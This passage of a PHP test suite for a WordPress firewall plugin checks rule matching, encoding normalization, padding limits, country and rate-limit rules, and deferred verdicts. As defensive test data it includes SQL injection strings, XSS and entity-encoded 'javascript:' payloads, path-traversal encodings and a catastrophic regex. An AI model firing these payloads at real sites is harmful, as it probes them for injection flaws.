$ok( 'ip-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.130' ), 'cookie' => $pfw_trust ) )['rule'], 'firewall Pro: the trust cookie never skips the blocklist' );
$ok( 'allowlist' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.200' ) ) )['reason'], 'firewall Pro: the allowlist wins over the blocklist' );
$ok( 'custom-r1' === $pfw_prun( array( 'server' => array( 'HTTP_X_DEBUG' => 'ON' ) ) )['rule'], 'firewall Pro: a custom header rule blocks' );
$ok( 'custom-r2' === $pfw_prun( array( 'uri' => '/partner-api/x', 'get' => array( 'q' => "1' OR '1'='1" ) ) )['reason'], 'firewall Pro: a custom allow rule skips the built-in rules' );
$pfw_v = $pfw_prun( array( 'get' => array( 'code' => 'promo-123' ) ) );
$ok( 'allow' === $pfw_v['action'] && array( 'custom-r3' ) === $pfw_v['logged'], 'firewall Pro: a custom log rule records its id and lets the request through' );
$ok( 'custom-r4' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '203.0.113.61' ) ) )['rule'], 'firewall Pro: a custom ip rule takes a CIDR block' );
$ok( 'allow' === $pfw_prun( array( 'server' => array( 'HTTP_USER_AGENT' => 'evilbot' ) ) )['action'], 'firewall Pro: a disabled custom rule does nothing' );
// Review Pro finding 2: a custom uri rule sees the path WordPress routes.
$pfw_ccfg                 = $pfw_cfg;
$pfw_ccfg['custom_rules'] = array(
	array( 'id' => 'priv', 'field' => 'uri', 'op' => 'contains', 'value' => '/private-area/', 'action' => 'block', 'enabled' => true ),
	array( 'id' => 'adm', 'field' => 'uri', 'op' => 'starts', 'value' => '/members/', 'action' => 'block', 'enabled' => true ),
	array( 'id' => 'tok', 'field' => 'query', 'op' => 'equals', 'value' => 'debug', 'action' => 'block', 'enabled' => true ),
	array( 'id' => 'raw', 'field' => 'uri_raw', 'op' => 'contains', 'value' => '%2e%2e', 'action' => 'block', 'enabled' => true ),
);
foreach ( array( '/private-area/x', '/private%2Darea/x', '/%70rivate-area/x', '//private-area/x', '/%2570rivate-area/x', '/PRIVATE-AREA/x' ) as $pfw_enc ) {
	$ok( 'custom-priv' === $pfw_run( array( 'config' => $pfw_ccfg, 'uri' => $pfw_enc ) )['rule'], 'firewall Pro finding 2: a custom uri rule blocks ' . $pfw_enc );
}
$ok( 'custom-adm' === $pfw_run( array( 'config' => $pfw_ccfg, 'uri' => '//./members/x' ) )['rule'] && 'custom-adm' === $pfw_run( array( 'config' => $pfw_ccfg, 'uri' => '/%6dembers/x?a=1' ) )['rule'], 'firewall Pro finding 2: a starts rule sees repeated slashes and ./ collapsed' );
$ok( 'custom-tok' === $pfw_run( array( 'config' => $pfw_ccfg, 'uri' => '/?mode=%2564ebug', 'get' => array( 'mode' => '%64ebug' ) ) )['rule'], 'firewall Pro finding 2: a custom query rule sees the decoded value' );
$ok( 'custom-raw' === $pfw_run( array( 'config' => $pfw_ccfg, 'uri' => '/a/%2E%2E/b' ) )['rule'] && 'allow' === $pfw_run( array( 'config' => $pfw_ccfg, 'uri' => '/public/x' ) )['action'], 'firewall Pro finding 2: uri_raw keeps the raw form, and other pages pass' );
// Review Pro: custom rules run bounded.
$pfw_rcfg2                 = $pfw_cfg;
$pfw_rcfg2['custom_rules'] = array(
	array( 'id' => 'bt', 'field' => 'query', 'op' => 'regex', 'value' => '^(\\d+)+$', 'action' => 'block', 'enabled' => true ),
	array( 'id' => 'next', 'field' => 'query', 'op' => 'contains', 'value' => 'needle', 'action' => 'block', 'enabled' => true ),
);
$pfw_bt = array();
for ( $pfw_i = 0; $pfw_i < 200; $pfw_i++ ) {
	$pfw_bt[ 'f' . $pfw_i ] = str_repeat( '1', 40 ) . 'x';
}
$pfw_limit = ini_get( 'pcre.backtrack_limit' );
$pfw_t     = microtime( true );
$pfw_v     = $pfw_run( array( 'config' => $pfw_rcfg2, 'get' => $pfw_bt ) );
$pfw_ms    = ( microtime( true ) - $pfw_t ) * 1000;
$ok( 'allow' === $pfw_v['action'] && 1 === count( array_keys( $pfw_v['notes'], 'custom_rule_error:custom-bt', true ) ) && $pfw_ms < 50, sprintf( 'firewall Pro: a catastrophic custom regex fails fast (%.1f ms for 200 fields), is skipped, and is noted once', $pfw_ms ) );
$ok( ini_get( 'pcre.backtrack_limit' ) === $pfw_limit, 'firewall Pro: the custom regex check restores pcre.backtrack_limit' );
$ok( 'custom-next' === $pfw_run( array( 'config' => $pfw_rcfg2, 'get' => array( 'a' => str_repeat( '1', 40 ) . 'x', 'b' => 'needle' ) ) )['rule'], 'firewall Pro: the rules after a skipped regex still run' );
$ok( 'custom-bt' === $pfw_run( array( 'config' => $pfw_rcfg2, 'get' => array( 'a' => '12345' ) ) )['rule'], 'firewall Pro: the same regex still matches a value it can finish' );
$pfw_rcfg2['custom_rules'] = array();
for ( $pfw_i = 0; $pfw_i < 100; $pfw_i++ ) {
	$pfw_rcfg2['custom_rules'][] = array( 'id' => 'n' . $pfw_i, 'field' => 'query', 'op' => 'equals', 'value' => 'never-' . $pfw_i, 'action' => 'block', 'enabled' => true );
}
$pfw_rcfg2['custom_rules'][] = array( 'id' => 'over', 'field' => 'query', 'op' => 'contains', 'value' => 'needle', 'action' => 'block', 'enabled' => true );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_rcfg2, 'get' => array( 'a' => 'needle' ) ) )['action'], 'firewall Pro: the engine evaluates at most 100 custom rules' );
$pfw_rcfg2['custom_rules'] = array( array( 'id' => 'tail', 'field' => 'post', 'op' => 'contains', 'value' => 'needle', 'action' => 'block', 'enabled' => true ) );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_rcfg2, 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'a' => str_repeat( 'x', 65536 ) . 'needle' ) ) )['action'] && 'custom-tail' === $pfw_run( array( 'config' => $pfw_rcfg2, 'server' => array( 'REQUEST_METHOD' => 'POST' ), 'post' => array( 'a' => str_repeat( 'x', 65000 ) . 'needle' ) ) )['rule'], 'firewall Pro: a custom rule compares the first 64 KB of each value' );
$ok( 'country-001' === $pfw_prun( array( 'server' => array( 'REMOTE_ADDR' => '173.245.48.10', 'HTTP_CF_CONNECTING_IP' => '203.0.113.9', 'HTTP_CF_IPCOUNTRY' => 'KP' ) ) )['rule'], 'firewall Pro: CF-IPCountry from a Cloudflare connection blocks a listed country' );
$ok( 'allow' === $pfw_prun( array( 'server' => array( 'HTTP_CF_IPCOUNTRY' => 'KP' ) ) )['action'], 'firewall Pro: CF-IPCountry from outside Cloudflare is ignored' );
$ok( 'allow' === $pfw_prun( array( 'server' => array( 'GEOIP_COUNTRY_CODE' => 'KP' ) ) )['action'], 'firewall Pro: a server country variable counts only when the owner says the server sets it' );
$pfw_trusting                            = $pfw_pro;
$pfw_trusting['country']['trust_server'] = true;
$ok( 'country-001' === $pfw_run( array( 'config' => $pfw_trusting, 'server' => array( 'GEOIP_COUNTRY_CODE' => 'KP' ) ) )['rule'], 'firewall Pro: GEOIP_COUNTRY_CODE counts when trust_server is on' );
$pfw_allow_mode                       = $pfw_pro;
$pfw_allow_mode['country']['mode']    = 'allow';
$pfw_allow_mode['country']['countries'] = array( 'US' );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_allow_mode ) )['action'], 'firewall Pro: an unknown country never blocks in allow mode' );
$ok( Perdita_Firewall::country_code( $pfw_cfg, array( 'REMOTE_ADDR' => '203.0.113.9' ), '203.0.113.9' ) === '' || is_file( PERDITA_CORE_DIR . 'inc/modules/security/firewall/class-perdita-firewall-geo.php' ), 'firewall Pro: country_code() answers empty with no source and no Geo class' );
$pfw_v = $pfw_prun( array( 'uri' => '/wp-login.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ) ) );
if ( function_exists( 'apcu_enabled' ) && apcu_enabled() ) {
	$ok( 'allow' === $pfw_v['action'], 'firewall Pro: one login POST stays under the rate limit' );
} else {
	$ok( 'allow' === $pfw_v['action'] && in_array( 'rate_limits_skipped_no_apcu', $pfw_v['notes'], true ), 'firewall Pro: without APCu the rate limits skip and the verdict says so' );
}
// Pro's engine requests: the auto-block file, login paths, the Geo class
// file, rate limits after trust, and the last verdict.
$pfw_fwdir = $pfw_cfg['fw_dir'];
wp_mkdir_p( $pfw_fwdir );
$ok( WP_CONTENT_DIR === $pfw_cfg['content_dir'] && Perdita_Firewall_Config::dir() === $pfw_fwdir, 'firewall Pro: the config carries content_dir and fw_dir' );
file_put_contents( $pfw_fwdir . 'blocked.php', '<?php return array( "203.0.113.77" => ' . ( time() + 600 ) . ', "203.0.113.78" => ' . ( time() - 5 ) . ' );' );
$pfw_bcfg                 = $pfw_cfg;
$pfw_bcfg['blocked_file'] = $pfw_fwdir . 'blocked.php';
$ok( 'ip-002' === $pfw_run( array( 'config' => $pfw_bcfg, 'server' => array( 'REMOTE_ADDR' => '203.0.113.77' ) ) )['rule'], 'firewall Pro: an address in blocked_file blocks as ip-002' );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_bcfg, 'server' => array( 'REMOTE_ADDR' => '203.0.113.78' ) ) )['action'], 'firewall Pro: an expired blocked_file entry no longer blocks, with no recompile' );
$ok( 'ip-002' === $pfw_run( array( 'config' => $pfw_bcfg, 'server' => array( 'REMOTE_ADDR' => '203.0.113.77' ), 'cookie' => $pfw_trust ) )['rule'], 'firewall Pro: the trust cookie never skips blocked_file' );
$ok( 'allowlist' === $pfw_run( array( 'config' => array_merge( $pfw_bcfg, array( 'allowlist' => Perdita_Firewall::parse_ranges( array( '203.0.113.77' ) ) ) ), 'server' => array( 'REMOTE_ADDR' => '203.0.113.77' ) ) )['reason'], 'firewall Pro: the allowlist wins over blocked_file' );
$pfw_outside = $pfw_tmp . 'blocked-outside.php';
file_put_contents( $pfw_outside, '<?php return array( "203.0.113.77" => ' . ( time() + 600 ) . ' );' );
$pfw_bcfg['blocked_file'] = $pfw_outside;
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_bcfg, 'server' => array( 'REMOTE_ADDR' => '203.0.113.77' ) ) )['action'] && '' === Perdita_Firewall::safe_file( $pfw_cfg, $pfw_outside ), 'firewall Pro: the engine never includes a blocked_file outside wp-content and the firewall folder' );
$ok( null === Perdita_Firewall_Config::exclusion_for_entry( array( 'rule' => 'ip-002', 'uri' => '/' ) ), 'firewall Pro: an auto-block offers no Allow button' );
$pfw_bad = array(
	'truncated' => '<?php return array( "203.0.113.77" => ' . ( time() + 600 ),
	'throws'    => '<?php throw new RuntimeException( "corrupt" );',
	'types'     => '<?php return array( "203.0.113.77" => "' . ( time() + 600 ) . '" );',
	'scalar'    => '<?php return "203.0.113.77";',
);
foreach ( $pfw_bad as $pfw_kind => $pfw_src ) {
	file_put_contents( $pfw_fwdir . 'blocked.php', $pfw_src );
	$pfw_bcfg['blocked_file'] = $pfw_fwdir . 'blocked.php';
	$pfw_v = null;
	try {
		$pfw_v = $pfw_run( array( 'config' => $pfw_bcfg, 'server' => array( 'REMOTE_ADDR' => '203.0.113.77' ) ) );
	} catch ( \Throwable $pfw_e ) {
		$pfw_v = null;
	}
	$ok( is_array( $pfw_v ) && 'allow' === $pfw_v['action'], 'firewall Pro: a ' . $pfw_kind . ' blocked_file counts as empty and never throws' );
}

$pfw_lcfg                = $pfw_cfg;
$pfw_lcfg['login_paths'] = array( 'my-login', '/Team-Door/' );
$ok( Perdita_Firewall::is_login_path( $pfw_lcfg, '/my-login' ) && Perdita_Firewall::is_login_path( $pfw_lcfg, '/team-door/x' ) && Perdita_Firewall::is_login_path( $pfw_lcfg, '/blog/wp-login.php' ), 'firewall Pro: login_paths count as login beside wp-login.php' );
$ok( ! Perdita_Firewall::is_login_path( $pfw_lcfg, '/my-login-page' ) && ! Perdita_Firewall::is_login_path( $pfw_cfg, '/my-login' ), 'firewall Pro: login_paths match on a segment, and nothing else counts without them' );
$pfw_lcfg['country'] = array( 'mode' => 'block', 'countries' => array( 'KP' ), 'scope' => 'login', 'trust_server' => true );
$ok( 'country-001' === $pfw_run( array( 'config' => $pfw_lcfg, 'uri' => '/my-login', 'server' => array( 'GEOIP_COUNTRY_CODE' => 'KP' ) ) )['rule'], 'firewall Pro: the country login scope covers a hidden login address' );
$ok( 'allow' === $pfw_run( array( 'config' => $pfw_lcfg, 'uri' => '/shop/', 'server' => array( 'GEOIP_COUNTRY_CODE' => 'KP' ) ) )['action'], 'firewall Pro: the country login scope leaves other pages alone' );

if ( ! class_exists( 'Perdita_Firewall_Geo', false ) ) {
	file_put_contents( $pfw_fwdir . 'geo-test.php', '<?php class Perdita_Firewall_Geo { public static function lookup( $ip, $config ) { return "203.0.113.9" === $ip && ! empty( $config["geo"]["file"] ) ? "kp" : ""; } }' );
	$pfw_gcfg            = $pfw_cfg;
	$pfw_gcfg['geo']     = array( 'class_file' => $pfw_fwdir . 'geo-test.php', 'file' => 'x.mmdb' );
	$pfw_gcfg['country'] = array( 'mode' => 'block', 'countries' => array( 'KP' ), 'scope' => 'site', 'trust_server' => false );
	$ok( 'KP' === Perdita_Firewall::country_code( $pfw_gcfg, array( 'REMOTE_ADDR' => '203.0.113.9' ), '203.0.113.9' ), 'firewall Pro: country_code() loads the Geo class from geo.class_file in the firewall folder' );
	$ok( 'country-001' === $pfw_run( array( 'config' => $pfw_gcfg, 'server' => array( 'REMOTE_ADDR' => '203.0.113.9' ) ) )['rule'], 'firewall Pro: a Geo lookup feeds the country rule' );
} else {
	echo "SKIP  firewall Pro: Geo class already loaded, so the class_file include check is skipped\n";
}
$ok( '' === Perdita_Firewall::safe_file( $pfw_cfg, '/etc/hosts' ) && '' === Perdita_Firewall::safe_file( $pfw_cfg, $pfw_tmp . 'nope.php' ) && '' !== Perdita_Firewall::safe_file( $pfw_cfg, $pfw_fwdir . 'blocked.php' ), 'firewall Pro: safe_file() takes only an existing .php file under wp-content or the firewall folder' );

$pfw_rcfg                = $pfw_cfg;
$pfw_rcfg['rate_limits'] = array( array( 'route' => 'any', 'limit' => 1, 'action' => 'block', 'block_minutes' => 1 ) );
$pfw_rsrv                = array( 'REMOTE_ADDR' => '203.0.113.' . wp_rand( 100, 199 ) );
if ( function_exists( 'apcu_enabled' ) && apcu_enabled() ) {
	$pfw_run( array( 'config' => $pfw_rcfg, 'server' => $pfw_rsrv ) );
	$ok( 'rate_limit' === $pfw_run( array( 'config' => $pfw_rcfg, 'server' => $pfw_rsrv ) )['category'], 'firewall Pro: a visitor over the rate limit blocks' );
	$ok( 'allow' === $pfw_run( array( 'config' => $pfw_rcfg, 'server' => $pfw_rsrv, 'cookie' => $pfw_trust ) )['action'], 'firewall Pro: a verified trust cookie skips the rate limits' );
} else {
	$ok( in_array( 'rate_limits_skipped_no_apcu', $pfw_run( array( 'config' => $pfw_rcfg ) )['notes'], true ) && ! in_array( 'rate_limits_skipped_no_apcu', $pfw_run( array( 'config' => $pfw_rcfg, 'cookie' => $pfw_trust ) )['notes'], true ), 'firewall Pro: a verified trust cookie skips the rate limits before they run' );
}

$pfw_mv = $pfw_run( array( 'config' => $pfw_monitor, 'get' => array( 'id' => "1' OR '1'='1" ) ) );
Perdita_Firewall::defer( $pfw_cfg, $pfw_mv, $pfw_server() );
$pfw_settled = Perdita_Firewall::resolve_pending( true );
$ok( $pfw_settled === Perdita_Firewall::last_verdict() && 'trusted_user' === Perdita_Firewall::last_verdict()['reason'], 'firewall Pro: last_verdict() returns the settled verdict' );
$pfw_unhook();
$ok( false !== strpos( $pfw_engine_src, 'self::$last = $verdict;' ), 'firewall Pro: boot() records each request\'s verdict for last_verdict()' );
foreach ( array( 'blocked.php', 'geo-test.php' ) as $pfw_name ) {
	if ( is_file( $pfw_fwdir . $pfw_name ) ) {
		unlink( $pfw_fwdir . $pfw_name );
	}
}

$pfw_empty = $pfw_cfg;
foreach ( array( 'blocklist', 'custom_rules', 'country', 'rate_limits' ) as $pfw_sec ) {
	unset( $pfw_empty[ $pfw_sec ] );
}
$pfw_v = $pfw_run( array( 'config' => $pfw_empty, 'uri' => '/wp-login.php', 'server' => array( 'REQUEST_METHOD' => 'POST' ) ) );
$ok( 'allow' === $pfw_v['action'] && array() === $pfw_v['notes'], 'firewall Pro: every Pro section is a no-op when absent' );

/* ---------- normalization and engine helpers ---------- */

$ok( "' or 1=1" === Perdita_Firewall::normalize( '%2527%20OR%201%3D1' ), 'firewall: normalize() catches double URL encoding of a quote' );
$ok( '<script>' === Perdita_Firewall::normalize( '&lt;SCRIPT&gt;' ) && 'javascript:' === Perdita_Firewall::normalize( '&#x6A;avascript&#58;' ), 'firewall: normalize() decodes named and numeric entities' );
$ok( 'sqli' === Perdita_Firewall::category_of( 'sqli-001' ) && 'php_upload' === Perdita_Firewall::category_of( 'upload-002' ) && 'probes' === Perdita_Firewall::category_of( 'probe-001' ), 'firewall: rule ids map to their categories' );
$pfw_ids = array();
foreach ( Perdita_Firewall::rules() as $pfw_cat => $pfw_list ) {
	foreach ( $pfw_list as $pfw_id => $pfw_pattern ) {
		$pfw_ids[] = $pfw_id;
		$ok( false !== @preg_match( '~' . $pfw_pattern . '~s', '' ), 'firewall: rule ' . $pfw_id . ' compiles' ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged -- the assertion is the error check.
	}
}
$ok( count( $pfw_ids ) === count( array_unique( $pfw_ids ) ), 'firewall: every rule id is unique' );
// Padding: no request-wide cap, and each field gets its first 64 KB and last 8 KB.
$pfw_post = array( 'REQUEST_METHOD' => 'POST' );
$pfw_big  = $pfw_run( array( 'server' => $pfw_post, 'post' => array( 'a' => str_repeat( 'x ', 150000 ), 'b' => "1' OR '1'='1" ) ) );
$ok( 'sqli-005' === $pfw_big['rule'] && 'post:b' === $pfw_big['field'], 'firewall padding: 300 KB of filler in one field never hides an attack in the next' );
$pfw_many = array();
for ( $pfw_i = 0; $pfw_i < 14; $pfw_i++ ) {
	$pfw_many[ 'pad' . $pfw_i ] = str_repeat( 'lorem ipsum ', 6000 );
}
for ( $pfw_i = 0; $pfw_i < 200; $pfw_i++ ) {
	$pfw_many[ 'small' . $pfw_i ] = str_repeat( 'lorem ipsum ', 600 );
}
$pfw_many['last'] = '<script>alert(1)</script>';
$pfw_v = $pfw_run( array( 'server' => $pfw_post, 'post' => $pfw_many ) );
$ok( 'xss-001' === $pfw_v['rule'] && in_array( 'inspection_budget_reached', $pfw_v['notes'], true ), 'firewall padding: an attack after 2.5 MB of filler fields still blocks, and the verdict notes inspection_budget_reached' );
unset( $pfw_many['last'] );
$pfw_many['late'] = str_repeat( 'lorem ipsum ', 6000 ) . '<script>alert(1)</script>';
$ok( 'xss-001' === $pfw_run( array( 'server' => $pfw_post, 'post' => $pfw_many ) )['rule'], 'firewall padding: past the 1 MB budget, a field still gets its last 4 KB checked' );
$pfw_many['late'] = '<script>alert(1)</script>' . str_repeat( 'lorem ipsum ', 6000 );
$ok( 'xss-001' === $pfw_run( array( 'server' => $pfw_post, 'post' => $pfw_many ) )['rule'], 'firewall padding: past the 1 MB budget, a field still gets its first 4 KB checked' );
$pfw_v = $pfw_run( array( 'server' => $pfw_post, 'post' => array( 'a' => str_repeat( 'lorem ipsum ', 6000 ) ) ) );
$ok( 'allow' === $pfw_v['action'] && ! in_array( 'inspection_budget_reached', $pfw_v['notes'], true ), 'firewall padding: a 72 KB field stays inside the budget' );
$pfw_v = $pfw_run( array( 'server' => $pfw_post, 'post' => array( 'a' => str_repeat( 'x ', 150000 ) . " 1' OR '1'='1" ) ) );
$ok( 'sqli-005' === $pfw_v['rule'] && ! in_array( 'inspection_truncated', $pfw_v['notes'], true ), 'firewall padding: an attack at the end of a 300 KB field blocks, inspected in full inside the budget' );
$pfw_v = $pfw_run( array( 'server' => $pfw_post, 'post' => array( 'a' => "1' OR '1'='1 " . str_repeat( 'x ', 150000 ) ) ) );
$ok( 'sqli-005' === $pfw_v['rule'], 'firewall padding: an attack at the start of a 300 KB field blocks (the first 64 KB)' );
$pfw_v = $pfw_run( array( 'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ), 'body' => wp_json_encode( array( 'pad' => str_repeat( 'a', 5000000 ), 'content' => "1' or '1'='1" ) ) ) );
$ok( 'anomaly-003' === $pfw_v['rule'] && 'json:pad' === $pfw_v['field'], 'firewall padding: a 5 MB JSON field with bytes the engine never read is an anomaly for an anonymous visitor' );
$pfw_v = $pfw_run( array( 'server' => array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json' ), 'body' => wp_json_encode( array( 'pad' => str_repeat( 'a', 900000 ), 'content' => "1' or '1'='1" ) ) ) );
$ok( 'sqli-005' === $pfw_v['rule'] && 'json:content' === $pfw_v['field'], 'firewall padding: a JSON body decodes whole, so a field after the filler blocks' );

// anomaly-003: no byte goes uninspected without a verdict.
$pfw_mid  = str_repeat( 'lorem ipsum ', 8500 ) . " 1' OR '1'='1 " . str_repeat( 'lorem ipsum ', 8500 );
$pfw_fill = array();
for ( $pfw_i = 0; $pfw_i < 16; $pfw_i++ ) {
	$pfw_fill[ 'pad' . $pfw_i ] = str_repeat( 'lorem ipsum ', 5462 );
}
$ok( 'sqli-005' === $pfw_run( array( 'server' => $pfw_post, 'post' => array( 'content' => $pfw_mid ) ) )['rule'], 'firewall anomaly-003: an attack in the middle of a 200 KB field blocks, inspected in full' );
$pfw_v = $pfw_run( array( 'server' => $pfw_post, 'post' => $pfw_fill + array( 'content' => $pfw_mid ) ) );
$ok( 'block' === $pfw_v['action'] && 'anomaly-003' === $pfw_v['rule'] && 'post:content' === $pfw_v['field'] && in_array( 'inspection_budget_reached', $pfw_v['notes'], true ), 'firewall anomaly-003: past 1 MB of filler, the middle of a 200 KB field is an anomaly' );
$ok( ! Perdita_Firewall::should_defer( $pfw_v, $pfw_cfg, array(), $pfw_server( '/', $pfw_post ), 'plugin' ), 'firewall anomaly-003: with no logged-in cookie and no Authorization header, the block is immediate' );
$pfw_huge = array( 'content' => str_repeat( 'lorem ipsum ', 131072 ) );
$ok( 'allow' === $pfw_run( array( 'server' => $pfw_post, 'post' => $pfw_huge, 'cookie' => $pfw_trust ) )['action'], 'firewall anomaly-003: a trusted editor\'s 1.5 MB post saves' );
$pfw_v = $pfw_run( array( 'server' => $pfw_post, 'post' => $pfw_huge, 'cookie' => $pfw_li ) );
$ok( 'anomaly-003' === $pfw_v['rule'] && Perdita_Firewall::should_defer( $pfw_v, $pfw_cfg, $pfw_li, $pfw_server( '/wp-admin/post.php', $pfw_post ), 'plugin' ), 'firewall anomaly-003: a signed-in 1.5 MB post with no trust cookie waits for WordPress' );
$pfw_mcfg         = $pfw_cfg;
$pfw_mcfg['mode'] = 'monitor';
$ok( 'monitor' === Perdita_Firewall::run( $pfw_mcfg, $pfw_server( '/', $pfw_post ), array(), $pfw_huge, array(), array() )['action'], 'firewall anomaly-003: monitor mode only records the anomaly' );
$pfw_xcfg               = $pfw_cfg;
$pfw_xcfg['exclusions'] = array( array( 'rule' => 'anomaly-003', 'path' => '/', 'param' => 'content' ) );
$pfw_v                  = Perdita_Firewall::run( $pfw_xcfg, $pfw_server( '/', $pfw_post ), array(), $pfw_huge, array(), array() );
$ok( 'allow' === $pfw_v['action'] && in_array( 'inspection_truncated', $pfw_v['notes'], true ), 'firewall anomaly-003: an owner exclusion lets the field through and the verdict notes inspection_truncated' );

$pfw_apsrv = $pfw_server( '/wp-json/wp/v2/posts', array( 'REQUEST_METHOD' => 'POST', 'CONTENT_TYPE' => 'application/json', 'PHP_AUTH_USER' => 'ed', 'PHP_AUTH_PW' => 'xxxx', 'HTTP_AUTHORIZATION' => 'Basic ' . base64_encode( 'ed:xxxx' ) ) );
$pfw_apv   = Perdita_Firewall::run( $pfw_cfg, $pfw_apsrv, array(), array(), array(), array(), wp_json_encode( array( 'title' => 'Big', 'content' => $pfw_huge['content'] ) ) );
$ok( 'anomaly-003' === $pfw_apv['rule'] && Perdita_Firewall::should_defer( $pfw_apv, $pfw_cfg, array(), $pfw_apsrv, 'plugin' ), 'firewall anomaly-003: an application password REST post of 1.5 MB waits for WordPress' );
$pfw_xssv = Perdita_Firewall::run( $pfw_cfg, $pfw_apsrv, array(), array(), array(), array(), wp_json_encode( array( 'title' => 'Embed', 'content' => '<script src="https://example.test/embed.js"></script>' ) ) );
$ok( 'xss' === $pfw_xssv['category'] && Perdita_Firewall::should_defer( $pfw_xssv, $pfw_cfg, array(), $pfw_apsrv, 'plugin' ), 'firewall app passwords: an Authorization header defers a content block in any category' );
$ok( ! Perdita_Firewall::should_defer( array_merge( $pfw_xssv, array( 'category' => 'ip_blocklist' ) ), $pfw_cfg, array(), $pfw_apsrv, 'plugin' ), 'firewall app passwords: an Authorization header never defers an IP block' );
$ok( 'rest' === Perdita_Firewall::settle_point( $pfw_cfg, $pfw_apsrv ) && 'rest' === Perdita_Firewall::settle_point( $pfw_cfg, $pfw_server( '/?rest_route=/wp/v2/posts', array( 'QUERY_STRING' => 'rest_route=/wp/v2/posts' ) ) ) && 'rest' === Perdita_Firewall::settle_point( array_merge( $pfw_cfg, array( 'rest_prefix' => 'api' ) ), $pfw_server( '/blog/api/wp/v2/posts' ) ) && 'xmlrpc' === Perdita_Firewall::settle_point( $pfw_cfg, array( 'SCRIPT_FILENAME' => ABSPATH . 'xmlrpc.php', 'REQUEST_URI' => '/xmlrpc.php' ) ) && 'init' === Perdita_Firewall::settle_point( $pfw_cfg, $pfw_server( '/wp-admin/post.php' ) ) && 'init' === Perdita_Firewall::settle_point( $pfw_cfg, $pfw_server( '/wp-jsonx/' ) ), 'firewall anomaly-003: deferred verdicts settle on the REST hook, XML-RPC\'s own hook, or init' );
$ok( ( function_exists( 'rest_get_url_prefix' ) ? rest_get_url_prefix() : 'wp-json' ) === $pfw_cfg['rest_prefix'], 'firewall anomaly-003: the config carries the REST prefix' );
$pfw_prev_user = get_current_user_id();
$pfw_ap_users  = array();
foreach ( array( 'editor', 'subscriber' ) as $pfw_role ) {
	$pfw_ap_users[ $pfw_role ] = wp_insert_user( array( 'user_login' => 'pfw_ap_' . $pfw_role . wp_rand( 1000, 9999 ), 'user_pass' => wp_generate_password( 24 ), 'user_email' => 'pfw_ap_' . $pfw_role . wp_rand( 1000, 9999 ) . '@example.test', 'role' => $pfw_role ) );
}
if ( ! is_wp_error( $pfw_ap_users['editor'] ) && ! is_wp_error( $pfw_ap_users['subscriber'] ) ) {
	Perdita_Firewall::defer( $pfw_cfg, $pfw_apv, $pfw_apsrv );
	$ok( Perdita_Firewall::REST_SETTLE_PRIORITY === has_filter( 'rest_authentication_errors', array( 'Perdita_Firewall', 'settle_rest' ) ) && false !== has_action( 'wp', array( 'Perdita_Firewall', 'settle' ) ) && false === has_action( 'init', array( 'Perdita_Firewall', 'settle' ) ), 'firewall anomaly-003: a REST verdict skips init, where application passwords are still unknown' );
	wp_set_current_user( $pfw_ap_users['editor'] );
	$pfw_v = Perdita_Firewall::resolve_pending();
	$ok( 'allow' === $pfw_v['action'] && 'trusted_user' === $pfw_v['reason'], 'firewall anomaly-003: an application password REST post of 1.5 MB from an editor passes' );
	$pfw_unhook();
	Perdita_Firewall::defer( $pfw_cfg, $pfw_apv, $pfw_apsrv );
	wp_set_current_user( $pfw_ap_users['subscriber'] );
	$pfw_v = Perdita_Firewall::resolve_pending();
	$ok( 'block' === $pfw_v['action'] && 403 === $pfw_v['status'] && 'anomaly-003' === $pfw_v['rule'], 'firewall anomaly-003: the same post from a subscriber gets the 403' );
	$pfw_unhook();
	foreach ( array( 'editor' => 'allow', 'subscriber' => 'block' ) as $pfw_role => $pfw_want ) {
		Perdita_Firewall::defer( $pfw_cfg, $pfw_xssv, $pfw_apsrv );
		wp_set_current_user( $pfw_ap_users[ $pfw_role ] );
		$ok( $pfw_want === Perdita_Firewall::resolve_pending()['action'], 'firewall app passwords: a REST post with a script embed from an application password ' . $pfw_role . ' settles as ' . $pfw_want );
		$pfw_unhook();
	}
	Perdita_Firewall::defer( $pfw_cfg, $pfw_xssv, $pfw_apsrv );
	wp_set_current_user( 0 );
	$ok( 'block' === Perdita_Firewall::resolve_pending()['action'], 'firewall app passwords: a junk Authorization header still gets the 403 once WordPress loads' );
	$pfw_unhook();
	$pfw_xsrv = array( 'SCRIPT_FILENAME' => ABSPATH . 'xmlrpc.php', 'REQUEST_URI' => '/xmlrpc.php', 'REQUEST_METHOD' => 'POST' );
	Perdita_Firewall::defer( $pfw_cfg, $pfw_apv, $pfw_xsrv );
	$ok( false !== has_action( 'xmlrpc_call', array( 'Perdita_Firewall', 'settle' ) ) && false !== has_action( 'init', array( 'Perdita_Firewall', 'settle_if_trusted' ) ), 'firewall anomaly-003: an XML-RPC verdict settles on xmlrpc_call, after XML-RPC logs the user in' );
	wp_set_current_user( $pfw_ap_users['subscriber'] );
	Perdita_Firewall::settle_if_trusted();
	$ok( Perdita_Firewall::has_pending(), 'firewall anomaly-003: at init, an XML-RPC user without the capability still waits for xmlrpc_call' );
	wp_set_current_user( $pfw_ap_users['editor'] );
	Perdita_Firewall::settle_if_trusted();
	$ok( ! Perdita_Firewall::has_pending() && 'allow' === Perdita_Firewall::last_verdict()['action'], 'firewall anomaly-003: an XML-RPC user WordPress already knows at init passes' );
	$pfw_unhook();
}
$ok( 'kept' === Perdita_Firewall::settle_rest( 'kept' ), 'firewall anomaly-003: settle_rest() passes the REST auth value on' );
wp_set_current_user( $pfw_prev_user );
require_once ABSPATH . 'wp-admin/includes/user.php';
foreach ( $pfw_ap_users as $pfw_uid ) {
	if ( ! is_wp_error( $pfw_uid ) ) {
		wp_delete_user( $pfw_uid );
	}
}

/* ---------- log ---------- */

$pfw_logcfg            = $pfw_cfg;
$pfw_logcfg['log_dir'] = Perdita_Firewall_Config::log_dir();
